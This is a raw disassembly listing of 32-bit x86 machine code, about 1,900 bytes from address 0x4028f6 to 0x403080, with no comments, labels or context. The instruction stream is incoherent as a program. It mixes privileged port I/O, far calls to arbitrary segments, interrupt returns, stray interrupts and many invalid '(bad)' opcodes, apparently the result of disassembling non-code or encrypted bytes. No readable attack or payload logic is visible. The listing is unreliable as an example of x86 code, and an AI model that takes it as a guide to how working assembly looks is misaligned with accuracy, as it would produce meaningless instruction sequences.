  4028f6:	mov    eax,0x2cc5d65a
  4028fb:	add    ch,al
  4028fd:	repnz mov ch,0x1
  402900:	pop    eax
  402901:	push   esi
  402902:	out    dx,al
  402903:	and    esp,DWORD PTR [ecx+0x46]
  402906:	adc    BYTE PTR [ebx+ebp*8],bl
  402909:	jle    0x4028f9
  40290b:	adc    al,0xae
  40290d:	mov    ah,0x1f
  40290f:	fstp   QWORD PTR [edi-0x5f6ba3b4]
  402915:	cs pusha 
  402917:	test   DWORD PTR [esi-0x6a],ebx
  40291a:	cmp    BYTE PTR [edi+0x73],dl
  40291d:	dec    eax
  40291e:	jg     0x4028ed
  402920:	mov    ebp,0x3112fbdf
  402925:	pop    ebp
  402926:	push   es
  402927:	gs dec bp
  40292a:	popa   
  40292b:	mov    esp,DWORD PTR [ebp+0x6fabe122]
  402931:	mov    esi,0xf7641fd6
  402936:	or     eax,0x5183acd0
  40293b:	push   ebx
  40293c:	repz or BYTE PTR [ebp+edx*2+0x570331ee],0x44
  402945:	mov    bh,0x74
  402947:	mov    cl,0xce
  402949:	pushf  
  40294a:	ins    DWORD PTR es:[edi],dx
  40294b:	cmp    dl,ch
  40294d:	push   0x35e73e2b
  402952:	inc    ebx
  402953:	js     0x40290f
  402955:	jge    0x402901
  402957:	jecxz  0x4028ea
  402959:	scas   al,BYTE PTR es:[edi]
  40295a:	xchg   DWORD PTR [eax+0x66],ecx
  40295d:	push   esp
  40295e:	sbb    cl,0x16
  402961:	cmp    esi,ebp
  402963:	jbe    0x40292f
  402965:	js     0x4029be
  402967:	pop    ecx
  402968:	add    DWORD PTR [ebx+0x76],esi
  40296b:	cwde   
  40296c:	xchg   edx,eax
  40296d:	test   BYTE PTR [ecx+0x553d122a],bl
  402973:	jp     0x40298e
  402975:	xchg   ebx,eax
  402976:	cmp    BYTE PTR [edx-0x350128b7],dh
  40297c:	mov    cl,0x58
  40297e:	sti    
  40297f:	dec    ebx
  402980:	lea    ebx,[eax]
  402982:	js     0x402981
  402984:	or     bl,BYTE PTR [edi+0x28]
  402987:	je     0x40297f
  402989:	push   ecx
  40298a:	pop    esi
  40298b:	sub    esp,ebp
  40298d:	fcmovnbe st,st(7)
  40298f:	jb     0x402968
  402991:	sub    BYTE PTR [ebx+0x27],al
  402994:	xchg   BYTE PTR [ecx+ebp*2+0x42],dh
  402998:	pop    es
  402999:	xchg   DWORD PTR [edi+0x69],ecx
  40299c:	fwait
  40299d:	sub    esp,DWORD PTR [edi]
  40299f:	shr    DWORD PTR [ebx],0x30
  4029a2:	xchg   edi,eax
  4029a3:	pop    ss
  4029a4:	add    eax,0x79e1ae4c
  4029a9:	push   cs
  4029aa:	adc    dh,BYTE PTR [esi-0x2bc55f73]
  4029b0:	jmp    0x14c42525
  4029b5:	outs   dx,BYTE PTR ds:[esi]
  4029b6:	mov    edi,0x1e5ba151
  4029bb:	call   0x8582:0xab05df4d
  4029c2:	int    0xe2
  4029c4:	lods   al,BYTE PTR ds:[esi]
  4029c5:	lahf   
  4029c6:	outs   dx,BYTE PTR ds:[esi]
  4029c7:	into   
  4029c8:	jnp    0x402a38
  4029ca:	stc    
  4029cb:	or     eax,0x69808126
  4029d0:	push   ebx
  4029d1:	stos   BYTE PTR es:[edi],al
  4029d2:	fwait
  4029d3:	cmp    ah,dh
  4029d5:	cmc    
  4029d6:	sbb    cl,dh
  4029d8:	jge    0x40296a
  4029da:	outs   dx,BYTE PTR ds:[esi]
  4029db:	or     DWORD PTR [edi+0x1e64c5ea],esp
  4029e1:	mov    edx,0x76f96c72
  4029e6:	iret   
  4029e7:	add    ebx,DWORD PTR [ebx+0x59bcf411]
  4029ed:	rcr    DWORD PTR [eax+ecx*4-0x3feb1386],0xe4
  4029f5:	in     eax,dx
  4029f6:	jne    0x40298b
  4029f8:	jns    0x4029d9
  4029fa:	seta   BYTE PTR [ebx-0x68]
  4029fe:	pop    eax
  4029ff:	(bad)  
  402a00:	cmp    al,0x1b
  402a02:	inc    ecx
  402a03:	xor    BYTE PTR [edx],al
  402a05:	mov    dl,0x6f
  402a07:	nop
  402a08:	out    0xd1,al
  402a0a:	sub    edi,edx
  402a0c:	jno    0x402a0a
  402a0e:	jp     0x402a5a
  402a10:	test   eax,0xc0111bed
  402a15:	push   ecx
  402a16:	mov    dh,0x32
  402a18:	mov    al,0x20
  402a1a:	iret   
  402a1b:	inc    eax
  402a1c:	jae    0x4029af
  402a1e:	sbb    eax,0x4603cb63
  402a23:	test   ebp,ecx
  402a25:	xor    DWORD PTR [ebx],ebx
  402a27:	or     ecx,DWORD PTR [edx-0x2c48e109]
  402a2d:	jg     0x402a5b
  402a2f:	mov    eax,ds:0x16a77969
  402a34:	mov    edi,0x21ab6e90
  402a39:	push   ecx
  402a3a:	sub    DWORD PTR [edi+0x4d36fd65],edi
  402a40:	fadd   DWORD PTR [ebp+0x3d]
  402a43:	js     0x402a48
  402a45:	addr16 fs cli 
  402a48:	jno    0x402ac5
  402a4a:	cdq    
  402a4b:	mov    BYTE PTR ds:0xa95431d2,0xc8
  402a52:	sub    ah,BYTE PTR [ebp-0x1ff5634c]
  402a58:	sub    DWORD PTR [edx+0x32],ebp
  402a5b:	ret    
  402a5c:	enter  0x9e9b,0x15
  402a60:	inc    ebp
  402a61:	out    0xf6,al
  402a63:	jle    0x402a01
  402a65:	sbb    al,0x87
  402a67:	(bad)
  402a6b:	(bad)  
  402a6d:	(bad)  
  402a6e:	pop    ds
  402a6f:	inc    eax
  402a70:	inc    ebx
  402a71:	inc    edi
  402a72:	repnz lods eax,DWORD PTR ds:[esi]
  402a74:	xor    edi,edx
  402a76:	lods   eax,DWORD PTR ds:[esi]
  402a77:	mov    eax,0xc9de90bd
  402a7c:	int3   
  402a7d:	xlat   BYTE PTR ds:[ebx]
  402a7e:	inc    ebp
  402a7f:	nop
  402a80:	sub    eax,0xc36b99ed
  402a85:	sti    
  402a86:	(bad)  
  402a88:	adc    dh,dh
  402a8a:	xor    ebp,edi
  402a8c:	mov    esi,DWORD PTR [edi]
  402a8e:	mov    dh,0x6c
  402a90:	daa    
  402a91:	pop    esi
  402a92:	lods   eax,DWORD PTR ds:[esi]
  402a93:	(bad)  
  402a94:	push   es
  402a95:	pusha  
  402a96:	popf   
  402a97:	add    cl,BYTE PTR [edi+0x66]
  402a9a:	sub    eax,0x66cc63da
  402a9f:	fsub   DWORD PTR gs:[eax+0x24]
  402aa3:	dec    ebx
  402aa4:	jns    0x402a30
  402aa6:	xchg   edx,eax
  402aa7:	enter  0x3bca,0x50
  402aab:	sar    dl,0x2
  402aae:	jecxz  0x402a3f
  402ab0:	aad    0x67
  402ab2:	add    al,0x43
  402ab4:	pop    edi
  402ab5:	outs   dx,BYTE PTR ds:[esi]
  402ab6:	addr16 inc esi
  402ab8:	pusha  
  402ab9:	aad    0xbd
  402abb:	adc    esi,ebx
  402abd:	sbb    esi,DWORD PTR [eax+0x771bf564]
  402ac3:	test   al,0x47
  402ac5:	mov    eax,0xdc1a1106
  402aca:	sbb    dh,BYTE PTR [ebp-0x1d]
  402acd:	sbb    al,0x71
  402acf:	or     BYTE PTR [esi],ch
  402ad1:	dec    edi
  402ad2:	or     eax,0xa708bf8d
  402ad7:	fdiv   QWORD PTR [ecx]
  402ad9:	xchg   ecx,eax
  402ada:	stos   DWORD PTR es:[edi],eax
  402adb:	into   
  402adc:	ja     0x402a68
  402ade:	adc    eax,0xf6c908aa
  402ae3:	js     0x402b28
  402ae5:	mov    bh,al
  402ae7:	in     al,dx
  402ae8:	arpl   WORD PTR [edx+0x3f],ax
  402aeb:	in     eax,dx
  402aec:	rol    BYTE PTR [edi+0xa],0x39
  402af0:	lahf   
  402af1:	dec    edx
  402af2:	sbb    DWORD PTR [edi+0x75b50e2d],eax
  402af8:	pop    ebx
  402af9:	fisubr WORD PTR [ecx-0x10]
  402afc:	out    dx,al
  402afd:	xchg   edi,eax
  402afe:	mov    eax,0xdda10ab2
  402b03:	outs   dx,BYTE PTR ds:[esi]
  402b04:	repz popa 
  402b06:	fnstsw WORD PTR [ebp-0x460d2e2c]
  402b0c:	faddp  st(2),st
  402b0e:	push   ebp
  402b0f:	ret    0x7b2a
  402b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b13:	shl    BYTE PTR [edi-0x36219f8f],0xde
  402b1a:	ret    
  402b1b:	std    
  402b1c:	stos   DWORD PTR es:[edi],eax
  402b1d:	push   DWORD PTR [eax+0x7]
  402b20:	es retf 0xcf9e
  402b24:	xchg   esi,eax
  402b25:	mov    bl,0x16
  402b27:	inc    esp
  402b28:	pop    ebx
  402b29:	sbb    dl,BYTE PTR [esi]
  402b2b:	mov    DWORD PTR [eax+0x35765b00],esp
  402b31:	jae    0x402b3b
  402b33:	push   ds
  402b34:	jne    0x402aeb
  402b36:	or     al,BYTE PTR [edx+eax*1]
  402b39:	xor    BYTE PTR fs:[ecx],bl
  402b3c:	aaa    
  402b3d:	arpl   ax,ax
  402b3f:	leave  
  402b40:	icebp  
  402b41:	fcomp  DWORD PTR [ecx+ecx*2]
  402b44:	cld    
  402b45:	int3   
  402b46:	add    ch,BYTE PTR [ebx-0x51]
  402b49:	fcomp  DWORD PTR [edi]
  402b4b:	add    BYTE PTR [esi],al
  402b4d:	pop    esi
  402b4e:	jmp    0x402b14
  402b50:	add    dh,bh
  402b52:	sub    eax,0x2a168c37
  402b57:	(bad)  
  402b58:	dec    esi
  402b59:	inc    esi
  402b5a:	jle    0x402b3d
  402b5c:	cli    
  402b5d:	ins    DWORD PTR es:[edi],dx
  402b5e:	jl     0x402b1a
  402b60:	pop    ebp
  402b61:	bound  esi,QWORD PTR [eax]
  402b63:	sbb    al,0xe3
  402b65:	bound  esp,QWORD PTR [eax+0x13]
  402b68:	push   cs
  402b69:	push   esp
  402b6a:	mov    DWORD PTR [ecx-0x3f8736fe],edx
  402b70:	pop    ebx
  402b71:	pop    eax
  402b72:	xor    al,0x98
  402b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b75:	and    DWORD PTR [edi+0x555cb5d0],esp
  402b7b:	push   ecx
  402b7c:	jbe    0x402b49
  402b7e:	cmp    DWORD PTR [edx+0x5e05af34],edx
  402b84:	push   es
  402b85:	aaa    
  402b86:	push   cs
  402b87:	cmp    bh,ch
  402b89:	pushf  
  402b8a:	rol    bl,1
  402b8c:	aad    0x46
  402b8e:	add    al,0x90
  402b90:	push   ss
  402b91:	out    0x78,al
  402b93:	rol    DWORD PTR [ebp-0x1d],cl
  402b96:	call   0xc2b1e350
  402b9b:	sbb    BYTE PTR [ecx],al
  402b9d:	pop    es
  402b9e:	fcmovnbe st,st(3)
  402ba0:	std    
  402ba1:	adc    BYTE PTR [eax],ah
  402ba3:	mov    fs,edi
  402ba5:	pop    ss
  402ba6:	mov    ah,0x37
  402ba8:	sub    eax,0x1cb0c007
  402bad:	pop    ecx
  402bae:	sub    eax,0x58e827b
  402bb3:	xor    BYTE PTR [esi-0x673e58],dl
  402bb9:	mov    BYTE PTR ds:0xfb509167,cl
  402bbf:	scas   eax,DWORD PTR es:[edi]
  402bc0:	jp     0x402bf4
  402bc2:	cmp    eax,0xa44f98a3
  402bc7:	xor    bl,dh
  402bc9:	arpl   WORD PTR [ecx-0x5ef8ed44],sp
  402bcf:	mov    BYTE PTR [ebx],0x93
  402bd2:	xlat   BYTE PTR ds:[ebx]
  402bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bd4:	xor    eax,0x47675619
  402bd9:	xchg   ebp,eax
  402bda:	fdivr  DWORD PTR ds:0xb6e50099
  402be0:	fstp   QWORD PTR [edi]
  402be2:	shr    BYTE PTR [esi+edx*1],0x1a
  402be6:	popa   
  402be7:	je     0x402b9e
  402be9:	stos   BYTE PTR es:[edi],al
  402bea:	mov    esp,0xa2435e61
  402bef:	in     al,0x38
  402bf1:	fwait
  402bf2:	xor    ebx,DWORD PTR [esi+0x2bc8b0ad]
  402bf8:	mov    esp,0xac2d904d
  402bfd:	icebp  
  402bfe:	mov    cs:0xc97f77b2,al
  402c04:	(bad)  
  402c05:	sub    BYTE PTR [eax+0x7c],ah
  402c08:	adc    eax,0x7d7b6d67
  402c0d:	or     eax,0x2036bdb8
  402c12:	add    al,0x7e
  402c14:	je     0x402bcd
  402c16:	nop
  402c17:	div    DWORD PTR [edx-0x7f]
  402c1a:	les    eax,FWORD PTR [edi]
  402c1c:	xchg   DWORD PTR [esi],ebp
  402c1e:	xchg   ebx,eax
  402c1f:	rcr    ecx,0xe2
  402c22:	mov    eax,0x9a316667
  402c27:	ror    ecx,cl
  402c29:	imul   DWORD PTR [edx]
  402c2b:	and    DWORD PTR [edx+edx*8],esi
  402c2e:	mov    bh,0xa5
  402c30:	adc    eax,0x7a77bddc
  402c35:	je     0x402c61
  402c37:	and    eax,0xf5f52816
  402c3c:	(bad)  
  402c3d:	test   eax,0xa2402a69
  402c42:	icebp  
  402c43:	test   BYTE PTR [ecx],0xe0
  402c46:	adc    eax,0xac29d709
  402c4b:	cmp    dh,bl
  402c4d:	jg     0x402bd4
  402c4f:	push   cs
  402c50:	or     eax,0x2eacdd4f
  402c55:	inc    eax
  402c56:	and    edi,esp
  402c58:	rcr    DWORD PTR [edi],0x8e
  402c5b:	lock fsubr st(4),st
  402c5e:	mov    ebx,DWORD PTR [eax+ebp*8+0x182b4306]
  402c65:	or     eax,0x726ac419
  402c6a:	stos   BYTE PTR es:[edi],al
  402c6b:	rol    BYTE PTR [edi+0x6f],cl
  402c6e:	mov    eax,ds:0x4a510d8e
  402c73:	mov    ebx,0xfd4a55a2
  402c78:	stos   DWORD PTR es:[edi],eax
  402c79:	pop    ds
  402c7a:	call   0x552b:0xa52cf17c
  402c81:	dec    ebx
  402c82:	ret    
  402c83:	or     bl,ch
  402c85:	cmp    eax,0x9e18e92
  402c8a:	rcl    ebx,0x6d
  402c8d:	xchg   esp,eax
  402c8e:	mov    bl,0xe
  402c90:	mov    esi,0x2e1f3c00
  402c95:	inc    ebx
  402c96:	pushf  
  402c97:	fidivr DWORD PTR [edi+0x60]
  402c9a:	in     eax,dx
  402c9b:	xchg   edx,eax
  402c9c:	sub    DWORD PTR [esi-0x43c1aec9],0x5d
  402ca3:	pop    eax
  402ca4:	pop    eax
  402ca5:	aaa    
  402ca6:	mov    ebp,ebp
  402ca8:	mov    BYTE PTR [ecx],dh
  402caa:	lods   eax,DWORD PTR ds:[esi]
  402cab:	mov    esp,0x93c3505
  402cb0:	xchg   ecx,eax
  402cb1:	pop    es
  402cb2:	inc    ecx
  402cb3:	mov    ecx,0xa408adbe
  402cb8:	int3   
  402cb9:	sub    dl,al
  402cbb:	xchg   ebp,eax
  402cbc:	dec    esp
  402cbd:	mov    eax,ds:0x242c6c74
  402cc2:	outs   dx,DWORD PTR es:[esi]
  402cc4:	je     0x402d08
  402cc6:	pop    eax
  402cc7:	mov    bl,0x94
  402cc9:	out    0xb8,eax
  402ccb:	iret   
  402ccc:	pushf  
  402ccd:	ins    DWORD PTR es:[edi],dx
  402cce:	fisttp QWORD PTR [ecx+0x79]
  402cd1:	inc    ebx
  402cd2:	jbe    0x402c65
  402cd4:	ja     0x402d04
  402cd6:	pop    edx
  402cd7:	mov    ah,0x56
  402cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cda:	jae    0x402d47
  402cdc:	jecxz  0x402cc9
  402cde:	push   esi
  402cdf:	push   ss
  402ce0:	test   eax,0xa76dd40a
  402ce5:	fdiv   DWORD PTR [edi+0x1a]
  402ce8:	xlat   BYTE PTR ds:[ebx]
  402ce9:	call   0xef58:0xa1231679
  402cf0:	sub    al,bh
  402cf2:	pop    ds
  402cf3:	sub    edx,DWORD PTR [edx+0x740bb373]
  402cf9:	cwde   
  402cfa:	dec    ecx
  402cfb:	add    eax,0xd55a15b2
  402d00:	js     0x402c87
  402d02:	imul   esi,DWORD PTR [ecx-0x29],0xffffff9e
  402d06:	fstp   DWORD PTR [esi]
  402d08:	dec    ebx
  402d09:	jb     0x402d66
  402d0b:	scas   al,BYTE PTR es:[edi]
  402d0c:	mov    bh,0x65
  402d0e:	add    al,0x60
  402d10:	xor    al,0x31
  402d12:	sub    DWORD PTR [esi+esi*8+0x7e],edi
  402d16:	jp     0x402d4a
  402d18:	mov    ds:0x17833978,eax
  402d1d:	add    al,0xe9
  402d1f:	dec    eax
  402d20:	and    ebp,edx
  402d22:	pushf  
  402d23:	test   al,0x75
  402d25:	imul   ebp,esi,0xb91960bf
  402d2b:	repz or DWORD PTR [ebx-0x35443706],eax
  402d32:	xlat   BYTE PTR ds:[ebx]
  402d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d34:	inc    edx
  402d35:	sub    DWORD PTR [edx-0x4155e35e],eax
  402d3b:	inc    esi
  402d3c:	xor    ah,0x17
  402d3f:	stos   BYTE PTR es:[edi],al
  402d40:	xor    eax,0x208cdc88
  402d45:	sub    ebx,DWORD PTR [edx-0x70362ae5]
  402d4b:	push   eax
  402d4c:	inc    edx
  402d4d:	sahf   
  402d4e:	xor    BYTE PTR [ebp-0x6e],0xe0
  402d52:	or     edx,DWORD PTR [esi]
  402d54:	fisubr DWORD PTR [edi+0x4d]
  402d57:	or     ecx,DWORD PTR [ebx+0x39729879]
  402d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d5e:	push   esi
  402d5f:	shl    dl,1
  402d61:	addr16 ret 
  402d63:	and    ebp,DWORD PTR [esi]
  402d65:	mov    esi,0x21c81f39
  402d6a:	push   0xffffffb1
  402d6c:	mov    ah,0x94
  402d6e:	repz xchg ecx,eax
  402d70:	pop    edi
  402d71:	xchg   bh,cl
  402d73:	mov    BYTE PTR ds:0x43c9bc77,bh
  402d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d7a:	jb     0x402d12
  402d7c:	lods   eax,DWORD PTR ds:[esi]
  402d7d:	pop    ebx
  402d7e:	fadd   DWORD PTR gs:[ecx+edi*8-0x3b]
  402d83:	aas    
  402d84:	std    
  402d85:	ret    
  402d86:	adc    esi,edi
  402d88:	(bad)  
  402d89:	sbb    eax,0x52b56dab
  402d8e:	test   DWORD PTR fs:[edi-0x1252843e],esp
  402d95:	mov    DWORD PTR [esp+esi*1+0x29eb14],edi
  402d9c:	xlat   BYTE PTR ds:[ebx]
  402d9d:	int    0x6
  402d9f:	dec    ecx
  402da0:	int    0xf8
  402da2:	ss js  0x402e01
  402da5:	ds jo  0x402d69
  402da8:	push   esp
  402da9:	dec    edi
  402daa:	pop    ebp
  402dab:	and    ebx,DWORD PTR [ecx+0x53]
  402dae:	out    0xc2,al
  402db0:	cmp    al,0x96
  402db2:	jl     0x402e25
  402db4:	mov    dl,0x21
  402db6:	test   BYTE PTR [edx+0x427ec1e3],dh
  402dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dbd:	(bad)  
  402dbe:	xor    edi,0x20ca9fb8
  402dc4:	fs stc 
  402dc6:	adc    al,BYTE PTR [ecx-0x47]
  402dc9:	dec    ecx
  402dca:	(bad)  
  402dcb:	or     BYTE PTR ss:[esi-0x5d],ah
  402dcf:	dec    ebp
  402dd0:	out    dx,al
  402dd1:	out    dx,al
  402dd2:	call   0x17e52b31
  402dd7:	idiv   dl
  402dd9:	cmp    ecx,DWORD PTR [esi]
  402ddb:	xlat   BYTE PTR ds:[ebx]
  402ddc:	mov    ah,0x9b
  402dde:	mov    ds:0x5ea41598,eax
  402de3:	gs leave 
  402de5:	jle    0x402ddb
  402de7:	retf   
  402de8:	aaa    
  402de9:	push   es
  402dea:	jmp    0x5c33254d
  402def:	pop    ss
  402df0:	push   ebp
  402df1:	inc    edi
  402df2:	dec    edi
  402df3:	lock int3 
  402df5:	gs stos DWORD PTR es:[edi],eax
  402df7:	cwde   
  402df8:	dec    edi
  402df9:	jno    0x402db8
  402dfb:	dec    DWORD PTR [esp+ecx*2+0x4350342c]
  402e02:	(bad)  
  402e03:	dec    esp
  402e04:	sbb    eax,0x4cb4130c
  402e09:	push   cs
  402e0a:	in     eax,dx
  402e0b:	and    BYTE PTR [ebx-0x4d1dea5a],al
  402e11:	jno    0x402e7a
  402e13:	dec    edi
  402e14:	mov    bl,0x35
  402e16:	gs sbb al,0x27
  402e19:	jp     0x402e97
  402e1b:	cmc    
  402e1c:	xor    BYTE PTR [ecx-0x7900e204],dl
  402e22:	or     al,0x8
  402e24:	inc    eax
  402e25:	popa   
  402e26:	pop    ebp
  402e27:	xchg   ecx,eax
  402e28:	fist   WORD PTR [eax-0x75b7248d]
  402e2e:	xchg   esp,esi
  402e30:	sar    BYTE PTR [edx],0x58
  402e33:	sti    
  402e34:	xchg   edi,eax
  402e35:	sbb    DWORD PTR [edx-0x54281c34],0xffffffc0
  402e3c:	or     esi,esp
  402e3e:	xchg   esp,eax
  402e3f:	(bad)  
  402e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e41:	pusha  
  402e42:	jnp    0x402e77
  402e44:	fild   QWORD PTR ds:0x5c8daba4
  402e4a:	push   ebx
  402e4b:	stc    
  402e4c:	push   eax
  402e4d:	les    ecx,FWORD PTR [edi-0x47]
  402e50:	add    BYTE PTR [ebx+eax*4],al
  402e53:	dec    esi
  402e54:	or     edi,edx
  402e56:	test   ebx,0x905f25e6
  402e5c:	xor    dl,BYTE PTR [edi]
  402e5e:	lds    ebp,FWORD PTR [edi]
  402e60:	jne    0x402edf
  402e62:	dec    ebx
  402e63:	or     DWORD PTR ds:0x57ae1d5,0xffffffb2
  402e6a:	pop    eax
  402e6b:	jl     0x402e00
  402e6d:	pop    esi
  402e6e:	and    DWORD PTR [eax-0x3e7cf818],ebx
  402e74:	das    
  402e75:	mov    ds:0x4b791a3e,al
  402e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e7b:	mov    al,0xea
  402e7d:	aad    0xf8
  402e7f:	in     eax,0x76
  402e81:	xchg   DWORD PTR [esi-0x6b],eax
  402e84:	inc    esp
  402e85:	hlt    
  402e86:	ja     0x402e8f
  402e88:	lods   al,BYTE PTR cs:[esi]
  402e8a:	sub    ch,bh
  402e8c:	sbb    BYTE PTR [edx-0x60abb576],bl
  402e92:	aas    
  402e93:	mov    edx,0x8214062e
  402e98:	xor    BYTE PTR [eax-0x3c18379d],dh
  402e9e:	mov    ch,0x90
  402ea0:	aad    0xda
  402ea2:	or     al,0x2d
  402ea4:	fisttp DWORD PTR [eax+0x122d52e1]
  402eaa:	sahf   
  402eab:	jmp    FWORD PTR [eax+ebx*2-0x190e4533]
  402eb2:	dec    ecx
  402eb3:	ds loopne 0x402e91
  402eb6:	addr16 loopne 0x402ed3
  402eb9:	or     bh,BYTE PTR [eax]
  402ebb:	int    0x14
  402ebd:	mov    al,ds:0xae29c297
  402ec2:	add    ah,BYTE PTR [eax-0x56]
  402ec5:	repnz sub dh,BYTE PTR [edi+0x1567904f]
  402ecc:	call   0x47c4:0x372316fc
  402ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ed4:	mov    ah,0x7d
  402ed6:	dec    ebp
  402ed7:	push   edi
  402ed8:	(bad)  
  402ed9:	in     eax,dx
  402eda:	int3   
  402edb:	push   edx
  402edc:	or     al,0x7
  402ede:	into   
  402edf:	dec    ebx
  402ee0:	mov    ecx,0xc084b9c9
  402ee5:	inc    ebp
  402ee6:	std    
  402ee7:	and    al,0x83
  402ee9:	les    esi,FWORD PTR [eax]
  402eeb:	cwde   
  402eec:	mov    ebx,0x6b2b8ed8
  402ef1:	inc    BYTE PTR [esi-0x43e2cf53]
  402ef7:	cwde   
  402ef8:	stos   DWORD PTR es:[edi],eax
  402ef9:	in     al,dx
  402efa:	push   ebp
  402efb:	js     0x402f55
  402efd:	outs   dx,DWORD PTR ds:[esi]
  402efe:	jle    0x402f4b
  402f00:	jnp    0x402f40
  402f02:	push   esi
  402f03:	jp     0x402f51
  402f05:	mov    cl,0x80
  402f07:	push   0xb452435
  402f0c:	aad    0xf0
  402f0e:	push   ss
  402f0f:	mov    edx,ebx
  402f11:	sbb    eax,0x670328d5
  402f16:	cmp    cl,dl
  402f18:	jmp    0x402f28
  402f1a:	mov    es,WORD PTR [ebx-0x39]
  402f1d:	push   0x20
  402f1f:	(bad)  
  402f20:	loope  0x402eb3
  402f22:	out    dx,eax
  402f23:	mov    ecx,0xa03488ff
  402f28:	test   eax,0x783648f2
  402f2d:	and    esi,esp
  402f2f:	ins    DWORD PTR es:[edi],dx
  402f30:	clc    
  402f31:	loopne 0x402f16
  402f33:	or     eax,0x7256f803
  402f38:	sbb    eax,0xfcbd0249
  402f3d:	mov    ds:0xf83e916d,eax
  402f42:	lahf   
  402f43:	xor    cl,bh
  402f45:	mov    esp,0x7f592a38
  402f4a:	enter  0xf858,0x9c
  402f4e:	lods   eax,DWORD PTR ds:[esi]
  402f4f:	add    dh,BYTE PTR [edi]
  402f51:	out    0x6f,eax
  402f53:	inc    ecx
  402f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f55:	jne    0x402ee0
  402f57:	fidivr DWORD PTR [edx-0x1b59893d]
  402f5d:	sub    al,0x94
  402f5f:	pop    ss
  402f60:	ins    DWORD PTR es:[edi],dx
  402f61:	daa    
  402f62:	cmp    ch,bh
  402f64:	int3   
  402f65:	jno    0x402fd5
  402f67:	sbb    dh,BYTE PTR [edi]
  402f69:	into   
  402f6a:	sub    cl,BYTE PTR [ebx-0x61]
  402f6d:	and    DWORD PTR es:[bp+si-0x69],esp
  402f72:	jmp    0x4470:0x76e5580b
  402f79:	std    
  402f7a:	je     0x402fb6
  402f7c:	cmc    
  402f7d:	inc    edx
  402f7e:	sti    
  402f7f:	add    al,0x7a
  402f81:	mov    edx,0xe242a3a8
  402f86:	sub    eax,edx
  402f88:	fadd   QWORD PTR [esi+0x2fa0fdd3]
  402f8e:	jmp    0xf97e9a25
  402f93:	mov    BYTE PTR [ebp-0x1f],0x7
  402f97:	cmp    dl,BYTE PTR [ecx+ebp*2]
  402f9a:	ds ds pushf 
  402f9d:	scas   al,BYTE PTR es:[edi]
  402f9e:	push   eax
  402f9f:	pop    ecx
  402fa0:	shr    BYTE PTR [ebx],0x40
  402fa3:	inc    edx
  402fa4:	cmp    eax,0x455aa22
  402fa9:	fst    DWORD PTR [ebx]
  402fab:	imul   esi,DWORD PTR [ecx-0x1d],0xff3e1bd
  402fb2:	scas   al,BYTE PTR es:[edi]
  402fb3:	lea    esp,gs:[esi-0x10]
  402fb7:	add    eax,DWORD PTR [edi]
  402fb9:	push   es
  402fba:	xchg   dl,al
  402fbc:	mov    al,ds:0x93015de6
  402fc1:	sub    edi,DWORD PTR [edx+0x33cab60]
  402fc7:	inc    ebp
  402fc8:	int    0x2a
  402fca:	ficomp WORD PTR [ecx+0x649cb2a3]
  402fd0:	push   ebp
  402fd1:	jmp    0x40300b
  402fd3:	sar    ecx,1
  402fd5:	shl    BYTE PTR [ebx],0x51
  402fd8:	jnp    0x402f78
  402fda:	sub    ebx,ecx
  402fdc:	mov    esi,0x3e7c7819
  402fe1:	fwait
  402fe2:	lea    edx,[esi+0x18]
  402fe5:	lods   eax,DWORD PTR ds:[esi]
  402fe6:	fdiv   QWORD PTR [edx]
  402fe8:	adc    ch,BYTE PTR [edi]
  402fea:	lods   al,BYTE PTR ds:[esi]
  402feb:	mov    ebx,0xfc90ac82
  402ff0:	div    DWORD PTR [ecx]
  402ff2:	sub    DWORD PTR [ebp+0x6f0e91a9],edx
  402ff8:	enter  0xd0f3,0xae
  402ffc:	aas    
  402ffd:	sahf   
  402ffe:	retf   
  402fff:	je     0x402fb1
  403001:	and    DWORD PTR [eax+eiz*2+0x72],0x76db8c12
  403009:	clc    
  40300a:	lea    edx,[ebp-0x54]
  40300d:	inc    ebp
  40300e:	xchg   ecx,eax
  40300f:	sub    DWORD PTR [esi+0x30],esi
  403012:	idiv   DWORD PTR [eax+0x3c86287f]
  403018:	mov    cs,WORD PTR [ecx]
  40301a:	bound  ecx,QWORD PTR [edx+0x5de0477b]
  403020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403021:	push   ds
  403022:	pop    ds
  403023:	out    dx,eax
  403024:	and    dl,ah
  403026:	sub    DWORD PTR [edx+0x61],esi
  403029:	iret   
  40302a:	repnz imul DWORD PTR [edx]
  40302d:	push   eax
  40302e:	jnp    0x402fc2
  403030:	lahf   
  403031:	mov    gs,ebp
  403033:	ins    BYTE PTR es:[edi],dx
  403034:	imul   edi,DWORD PTR [ecx-0x42],0x4
  403038:	adc    ecx,ebx
  40303a:	aas    
  40303b:	in     eax,0x7b
  40303d:	ret    0x40a4
  403040:	loop   0x403040
  403042:	dec    ebx
  403043:	push   ebx
  403044:	push   esp
  403045:	int3   
  403046:	sbb    al,BYTE PTR ds:0x24b35304
  40304c:	aad    0xde
  40304e:	aaa    
  40304f:	jo     0x4030b5
  403051:	mov    dh,dh
  403053:	call   0xe6efaa22
  403058:	jbe    0x4030c0
  40305a:	imul   esi,DWORD PTR [eax+eiz*1+0x57],0x5a
  40305f:	xor    eax,0x483443d4
  403064:	pop    ebp
  403065:	fimul  DWORD PTR [ecx]
  403067:	or     BYTE PTR [esi],0xcd
  40306a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40306b:	fimul  DWORD PTR [eax]
  40306d:	jge    0x40309e
  40306f:	paddb  mm0,QWORD PTR [edx-0x58]
  403073:	mov    cl,0x87
  403075:	scas   al,BYTE PTR es:[edi]
  403076:	sti    
  403077:	inc    DWORD PTR [edx+edx*2-0x43]
  40307b:	mov    edx,0x22f2cc90
  403080:	test   DWORD PTR [ebx],0xf6d80070
